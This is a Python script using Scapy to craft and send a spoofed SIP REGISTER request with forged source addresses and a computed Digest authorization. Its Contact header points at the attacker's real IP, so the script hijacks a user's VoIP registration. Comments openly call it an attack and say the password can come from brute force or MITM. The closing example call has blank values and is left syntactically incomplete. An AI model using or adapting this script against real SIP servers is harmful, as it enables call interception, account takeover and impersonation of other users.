from scapy.all import *
import hashlib
import random

def generate_digest_response(username, realm, password, nonce, uri, cnonce, nc, qop):
    """Calculate the Digest Authentication response using MD5."""
    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"REGISTER:{uri}".encode()).hexdigest()
    response = hashlib.md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode()).hexdigest()
    return response

def craft_spoofed_sip_register(dst_ip, dst_port, src_ip, src_port, user, realm, password, nonce, contact_ip, contact_port):
    """
    Craft a spoofed SIP REGISTER packet using Scapy.
    """
    cnonce = ""  # Provided cnonce
    nc = "" #nc
    qop = "auth"
    uri = f"sip:{dst_ip}"
    
    auth_response = generate_digest_response(user, realm, password, nonce, uri, cnonce, nc, qop)

    sip_msg = (
        f"REGISTER sip:{dst_ip} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {src_ip}:{src_port};branch=z9hG4bK{random.randint(100000,999999)}\r\n"
        f"Max-Forwards: 70\r\n"
        f"To: <sip:{user}@{dst_ip}>\r\n"
        f"From: <sip:{user}@{dst_ip}>;tag={random.randint(100000,999999)}\r\n"
        f"Call-ID: MrdVgEIedz\r\n"
        f"CSeq: 26 REGISTER\r\n"
        f"Contact: <sip:{user}@{contact_ip}:{contact_port};transport=udp>\r\n"
        f"Expires: 3600\r\n"
        f"Authorization: Digest username=\"{user}\", realm=\"{realm}\", nonce=\"{nonce}\", uri=\"{uri}\", response=\"{auth_response}\", cnonce=\"{cnonce}\", nc={nc}, qop={qop}\r\n"
        f"User-Agent: Linphone-Desktop/5.2.6 (Modified)\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    # Create a UDP packet
    packet = IP(dst=dst_ip, src=src_ip) / UDP(dport=dst_port, sport=src_port) / Raw(load=sip_msg)

    return packet

def send_spoofed_register(dst_ip, dst_port, src_ip, src_port, user, realm, password, nonce, contact_ip, contact_port):
    """
    Send the crafted SIP REGISTER request.
    """
    packet = craft_spoofed_sip_register(dst_ip, dst_port, src_ip, src_port, user, realm, password, nonce, contact_ip, contact_port)
    send(packet, verbose=True)

# Example usage (Need password for successful attack)
send_spoofed_register(
    dst_ip="",  # Target SIP Server
    dst_port=5060,
    src_ip="",  # Spoofed attacker IP
    src_port=5060,
    user="",
    realm="",
    password="",  # If obtained via another attack (Brute-force, MITM, etc.)
    nonce="", #nonce most important
    contact_ip="",  # Attacker's real IP
    contact_port=  # Provided contact port
)
